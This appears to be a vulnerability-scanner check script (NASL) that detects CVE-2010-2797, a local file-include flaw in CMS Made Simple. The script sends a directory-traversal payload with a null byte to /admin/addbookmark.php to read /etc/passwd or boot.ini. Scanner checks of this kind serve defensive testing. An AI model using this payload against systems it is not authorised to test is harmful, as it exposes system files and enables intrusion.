CPE = "cpe:/a:cmsmadesimple:cms_made_simple";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100716" );
	script_version( "$Revision: 13960 $" );
	script_cve_id( "CVE-2010-2797" );
	script_bugtraq_id( 41565 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $" );
	script_tag( name: "creation_date", value: "2010-07-14 13:50:55 +0200 (Wed, 14 Jul 2010)" );
	script_name( "CMS Made Simple 'default_cms_lang' Parameter Local File Include Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/41565" );
	script_xref( name: "URL", value: "http://www.cmsmadesimple.org/" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "cms_made_simple_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "cmsmadesimple/installed" );
	script_tag( name: "summary", value: "CMS Made Simple is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain potentially sensitive
  information and execute arbitrary local scripts in the context of the webserver process. This may allow the
  attacker to compromise the application and the underlying computer. Other attacks are also possible." );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = make_array( "root:.*:0:[01]:", "etc/passwd", "\\[boot loader\\]", "boot.ini" );
filename = NASLString( dir, "/admin/addbookmark.php" );
host = get_host_name();
if(port != 80 && port != 443){
	host += ":" + port;
}
for file in keys( files ) {
	ex = NASLString( "default_cms_lang=", crap( data: "..%2f", length: "50" ), files[file], "%00" );
	req = NASLString( "POST ", filename, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Accept-Encoding: identity\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( ex ), "\\r\\n\\r\\n", ex );
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(result == NULL){
		continue;
	}
	if(egrep( pattern: file, string: result, icase: TRUE )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

